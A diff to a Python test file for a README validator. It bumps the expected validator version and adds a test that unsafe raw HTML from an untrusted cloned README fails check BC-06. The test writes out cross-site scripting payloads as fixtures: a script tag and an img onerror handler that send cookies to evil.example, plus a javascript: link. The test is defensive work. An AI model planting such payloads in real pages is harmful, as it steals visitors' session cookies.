@@ -289,7 +289,7 @@ def test_a_sound_candidate_passes_nine_checks_and_pends_the_two_judged_later(
     assert document["readme_sha256"] == hashlib.sha256(candidate.readme.encode()).hexdigest()
     assert len(document["protected_content_fingerprint"]) == 64
     assert document["advisory"] == []
-    assert document["source_revision"] == REVISION and document["validator_version"] == "3"
+    assert document["source_revision"] == REVISION and document["validator_version"] == "4"
 
 
 def test_the_coverage_ledger_records_each_row_against_the_evidence(tmp_path: Path) -> None:
@@ -893,6 +893,49 @@ def test_an_anchor_to_a_heading_the_candidate_dropped_names_the_section_it_rende
     )
     assert resolving != readme
     assert _verdicts(validate_candidate(_candidate(resolving), tmp_path, ()))["BC-06"] == "PASS"
+
+
+def test_unsafe_raw_html_surviving_from_an_adversarial_readme_fails_bc06(tmp_path: Path) -> None:
+    """G7-W01 (docs/THREAT_MODEL.md area 3). A cloned repository's own README is untrusted
+    content: `evidence/facts/inherited.py` captures a raw HTML block unit byte for byte like any
+    other inherited unit, and a reconciliation disposition may legitimately preserve one verbatim
+    (a real badge/logo block, say). Before this check, nothing ever looked at a preserved block's
+    own markup for a hazard - `extract_links` only ever walked an `<a>`/`<img>` tag's href/src.
+    A standalone `<script>` tag, an `onerror=` handler on an otherwise ordinary tag, and a
+    `javascript:` scheme each must fail BC-06 wherever they survive into the rendered candidate,
+    and the identical construct quoted inside a fenced code block (inert on GitHub) must not."""
+    readme = _candidate().readme
+    scripted = readme.replace(
+        "## Scope and Limitations\n\n",
+        "## Scope and Limitations\n\n"
+        "<script>fetch('https://evil.example/steal?t='+document.cookie)</script>\n\n",
+    )
+    assert scripted != readme
+    failed = _failed(validate_candidate(_candidate(scripted), tmp_path, ()), "BC-06")
+    assert any("unsafe raw HTML" in detail and "<script" in detail for detail in failed["details"])
+
+    handler = readme.replace(
+        "## Scope and Limitations\n\n",
+        "## Scope and Limitations\n\n"
+        '<img src="x.png" onerror="fetch(\'https://evil.example/steal\')">\n\n',
+    )
+    failed = _failed(validate_candidate(_candidate(handler), tmp_path, ()), "BC-06")
+    assert any("onerror=" in detail for detail in failed["details"])
+
+    scheme = readme.replace(
+        "## Scope and Limitations\n\n",
+        '## Scope and Limitations\n\n<a href="javascript:alert(1)">click</a>\n\n',
+    )
+    failed = _failed(validate_candidate(_candidate(scheme), tmp_path, ()), "BC-06")
+    assert any("javascript:" in detail for detail in failed["details"])
+
+    # The same literal text, fenced as a code example, renders as inert text on GitHub - not
+    # this hazard - and must not fail the check.
+    fenced = readme.replace(
+        "## Scope and Limitations\n\n",
+        "## Scope and Limitations\n\n```html\n<script>alert(1)</script>\n```\n\n",
+    )
+    assert _verdicts(validate_candidate(_candidate(fenced), tmp_path, ()))["BC-06"] == "PASS"
 
 
 def test_renderer_owned_reads_a_registrys_click_through_target_off_ecosystemspec() -> None:
